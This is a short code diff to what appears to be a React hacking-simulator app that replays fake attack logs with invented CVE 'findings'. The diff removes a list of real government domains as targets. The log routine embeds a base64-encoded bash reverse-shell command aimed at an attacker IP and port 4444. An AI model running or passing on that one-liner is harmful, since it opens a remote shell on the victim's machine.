@@ -1,9 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
 
-const REAL_GOV_DOMAINS = [
-  "cia.gov", "fbi.gov", "nasa.gov", "pentagon.mil", "defense.gov", "whitehouse.gov", "nsa.gov"
-];
-
 const REAL_CVE_DATABASE = [
   "[FOUND] CVE-2021-44228 - CVSS: 10.0 - Apache Log4j2 JNDI Remote Code Execution",
   "[FOUND] CVE-2021-41773 - CVSS: 7.5 - Apache HTTP Server path traversal and file disclosure",
@@ -227,7 +223,7 @@ const App: React.FC = () => {
           setAutoIdx(0);
           return;
         } else {
-          const line = item.log.replace(/{IP}/g, targetIP).replace(/{ATTACKER_IP}/g, attackerIP).replace(/{B64_CMD}/g, btoa(`bash -i >& /dev/tcp/${attackerIP}/4444 0>&1`));
+          const line = item.log.replace(/{IP}/g, targetIP).replace(/{DOMAIN}/g, targetDomain).replace(/{ATTACKER_IP}/g, attackerIP).replace(/{B64_CMD}/g, btoa(`bash -i >& /dev/tcp/${attackerIP}/4444 0>&1`));
           setDisplayedLogs(prev => [...prev, ...line.split('\n')]);
         }
         
